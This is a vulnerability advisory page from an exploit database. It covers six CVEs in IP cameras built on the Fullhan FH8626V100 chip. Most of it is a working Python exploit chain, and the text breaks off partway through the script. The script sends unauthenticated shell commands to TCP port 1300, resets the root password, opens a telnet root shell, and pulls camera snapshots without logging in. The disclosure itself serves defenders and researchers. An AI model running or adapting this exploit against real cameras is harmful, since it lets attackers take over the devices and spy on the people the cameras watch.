---
title: Fullhan FH8626V100 Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2026110002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-11-11
fetch_date: 2026-11-12T09:00:47.653336
---

# Fullhan FH8626V100 Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Fullhan FH8626V100 Multiple Vulnerabilities** **2026.11.11**  Credit:  **[Amir Aliu](https://cxsecurity.com/author/Amir%2BAliu/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-51407](https://cxsecurity.com/cveshow/CVE-2026-51407/ "Click to see CVE-2026-51407")** | **[CVE-2026-51402](https://cxsecurity.com/cveshow/CVE-2026-51402/ "Click to see CVE-2026-51402")** | **[CVE-2026-51403](https://cxsecurity.com/cveshow/CVE-2026-51403/ "Click to see CVE-2026-51403")** | **[CVE-2026-51404](https://cxsecurity.com/cveshow/CVE-2026-51404/ "Click to see CVE-2026-51404")** | **[CVE-2026-51405](https://cxsecurity.com/cveshow/CVE-2026-51405/ "Click to see CVE-2026-51405")** | **[CVE-2026-51406](https://cxsecurity.com/cveshow/CVE-2026-51406/ "Click to see CVE-2026-51406")**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")  [CWE-284](https://cxsecurity.com/cwe/CWE-284 "Click to see CWE-284")  [CWE-200](https://cxsecurity.com/cwe/CWE-200 "Click to see CWE-200")  [CWE-287](https://cxsecurity.com/cwe/CWE-287 "Click to see CWE-287")  [CWE-522](https://cxsecurity.com/cwe/CWE-522 "Click to see CWE-522")  [CWE-319](https://cxsecurity.com/cwe/CWE-319 "Click to see CWE-319")** | |

# Exploit Title: Fullhan FH8626V100 - Multiple Vulnerabilities
# Date: 31-03-2026
# Exploit Author: Amir Aliu
# Vendor Homepage: https://www.fullhan.com/
# Software Link: N/A - OEM/whitelabel IP camera module, rebranded under numerous vendor/brand names
# Version: Firmware v201222.1007 (Device Model AJL30PG0803)
# Tested on: FH8626V100 SoC (Fullhan FH86xx family), AJL30PG0803 device, BusyBox v1.19.3, embedded Linux (ARM)
# CVE: CVE-2026-51402, CVE-2026-51403, CVE-2026-51404, CVE-2026-51405, CVE-2026-51406, CVE-2026-51407
# Blog: https://amiraliu.vercel.app/blog/breaking-into-my-own-camera
# Source: https://github.com/amiraliuks/ip-camera-research
# Summary
A range of rebranded IP cameras built on the Fullhan FH8626V100 SoC and shipped with the "CareCam Pro" app expose a chain of vulnerabilities that lead to full device compromise.
- CVE-2026-51402: TCP/1300 accepts <SYSTEM>...</SYSTEM>-wrapped shell commands with no authentication (blind OS command injection, CWE-78).
- CVE-2026-51403: The PSIA HTTP API (/PSIA/\*) allows unauthenticated read/write access to device and network configuration (CWE-306/CWE-284).
- CVE-2026-51404: An unauthenticated JPEG snapshot is served on TCP/6688 (CWE-200).
- CVE-2026-51405: BusyBox telnetd is enabled by default via inetd, exposing a root shell to anyone holding valid credentials (CWE-287).
- CVE-2026-51406: /PSIA/Security/AAA/users discloses the admin username and password in plaintext with no authentication (CWE-522).
- CVE-2026-51407: Once shell access is obtained, /app/userdata/ifcfg.wlan0 stores the configured Wi-Fi SSID/password in plaintext (CWE-319).
# Exploitation Chain
The command injection (CVE-2026-51402) is used to reset the root password, which is then used to authenticate to the always-on Telnet service (CVE-2026-51405), yielding a full root shell with no valid credentials required at any point.
# Proof of Concept (PoC) [Full Chain]
import socket
import requests
import sys
import os
TARGET = None
NEW\_PASSWORD = "root"
# Helpers
def send\_system(cmd, port):
"""Send <SYSTEM> command to target"""
payload = f"<SYSTEM>{cmd}</SYSTEM>"
try:
with socket.socket() as s:
s.settimeout(3)
s.connect((TARGET, port))
s.send(payload.encode())
data = s.recv(1024).decode()
return data
except Exception:
return None
def check\_port(port):
"""Simple TCP check"""
try:
with socket.socket() as s:
s.settimeout(2)
s.connect((TARGET, port))
return True
except:
return False
# Checks
def check\_rce(port):
print(f"[.] Checking RCE on port {port}...")
res = send\_system("ls", port)
if res and "<SYSTEM\_ACK>ok</SYSTEM\_ACK>" in res:
print(f"[+] RCE available on port {port}")
return True
else:
print(f"[-] Port {port} not vulnerable")
return False
def check\_telnet():
print("[.] Checking telnet (port 23)...")
if check\_port(23):
print("[+] Telnet is open")
return True
else:
print("[-] Telnet is closed")
return False
def get\_snapshot(save=False):
print("[.] Fetching snapshot...")
try:
r = requests.get(f"http://{TARGET}:6688/snapshot.jpg", timeout=5)
if r.status\_code == 200:
if save:
with open("snapshot.jpg", "wb") as f:
f.write(r.content)
print("[+] snapshot.jpg saved")
return r.content
else:
print("[-] Failed to get snapshot")
return None
except Exception:
print("[-] Request failed")
return None
def show\_snapshot():
data = get\_snapshot(save=False)
if not data:
return
tmp\_file = "/tmp/snapshot.jpg"
with open(tmp\_file, "wb") as f:
f.write(data)
print("[+] Opening snapshot...")
os.system(f"xdg-open {tmp\_file}")
# Exploit
def reset\_root\_password():
print("[+] Changing root password...")
res = send\_system(f'echo "root:{NEW\_PASSWORD}" | chpasswd', 1300)
print(f"[+] Response: {res}")
if res and "<SYSTEM\_ACK>ok</SYSTEM\_ACK>" in res:
print(f"[+] Login -> user: root | pass: {NEW\_PASSWORD}")
return True
return False
def open\_telnet():
print("[.] Opening telnet session...")
os.system(f"telnet {TARGET}")
# Main
def usage():
print("Usage:")
print(" python exploit.py check <IP> [new\_password]")
print(" python exploit.py snapshot <IP>")
if \_\_name\_\_ == "\_\_main\_\_":
if len(sys.argv) < 2:
usage()
sys.exit(1)
mode = sys.argv[1]
if mode == "check":
if len(sys.argv) < 3:
usage()
sys.exit(1)
TARGET = sys.argv[2]
if len(sys.argv) >= 4:
NEW\_PASSWORD = sys.argv[3]
rce\_1300 = check\_rce(1300)
rce\_843 = check\_rce(843)
telnet = check\_telnet()
# snapshot behavior like original script
snapshot = get\_snapshot(save=True)
if snapshot:
choice = input("[?] View snapshot? (y/n): ").strip().lower()
if choice == "y":
os.system("xdg-open snapshot.jpg")
choice = input("[?] Keep snapshot file? (y/n): ").strip().lower()
if choice != "y":
os.remove("snapshot.jpg")
# Optional shell
if rce\_1300 and telnet:
choice = input("[?] Get shell? (y/n): ").strip().lower()
if choice == "y":
if reset\_root\_password():
open\_telnet()
elif mode == "snapshot":
if len(sys.argv) < 3:
usage()
sys...